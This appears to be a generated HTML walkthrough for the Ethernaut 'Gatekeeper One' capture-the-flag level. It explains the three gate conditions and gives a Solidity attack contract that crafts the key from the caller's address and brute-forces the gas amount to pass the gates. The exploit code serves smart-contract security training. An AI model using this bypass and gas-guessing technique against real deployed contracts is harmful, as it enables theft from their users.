@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 13: Gatekeeper One</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 13: Gatekeeper One</h1>
+
+        
+      </div>
+      
+        
+        <p>The three gates of <code>Gatekeeper One</code>:</p>
+<ol>
+<li><code>msg.sender</code> must not be <code>tx.origin</code> (as in <code>Telephone</code>).</li>
+<li>The amount of gas left at execution of <code>gateTwo</code> must be a multiple of 8191.</li>
+<li><code>key</code> must fulfil these conditions:<ul>
+<li>Bytes 4 and 5 must be zero. (Counting from the left and from zero.)</li>
+<li>Bytes 6 and 7 must be equal to the lowest two bytes of <code>tx.origin</code> (which, in the attacker
+contract, is identical with <code>msg.sender</code>).</li>
+<li>Bytes 0..3 must not all be zero.</li>
+</ul>
+</li>
+</ol>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./13_GatekeeperOne.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GatekeeperOneAttack</span> </span>{
+    GatekeeperOne <span class="hljs-keyword">public</span> instance;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> instanceAddr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        instance = GatekeeperOne(instanceAddr);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">passGate</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">uint64</span> ukey = <span class="hljs-number">0xffffffff00000000</span> + <span class="hljs-keyword">uint16</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
+        <span class="hljs-keyword">bytes8</span> key = <span class="hljs-keyword">bytes8</span>(ukey);
+        <span class="hljs-keyword">uint</span> addGas = <span class="hljs-number">250</span>;
+        <span class="hljs-keyword">bool</span> result = <span class="hljs-literal">false</span>;</pre></div>
+      
+        
+        <p>Since the value of <code>gasleft()</code> in <code>gateTwo</code> that was observed while simulating
+the attack locally does not match the one obtained when attacking the actual
+instance on Rinkeby, we guess in a range of 100 around the value that we found.</p>
+
+        <div class='highlight'><pre>        <span class="hljs-keyword">while</span>(!result &amp;&amp; addGas &lt; <span class="hljs-number">350</span>) {
+            <span class="hljs-keyword">try</span> instance.enter.<span class="hljs-built_in">gas</span>(<span class="hljs-number">4</span> * <span class="hljs-number">8191</span> + addGas)(key) <span class="hljs-keyword">returns</span> (<span class="hljs-keyword">bool</span> _result) {
+                result = _result;
+            } <span class="hljs-keyword">catch</span> {
+            }
+
+            addGas++;
+        }
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
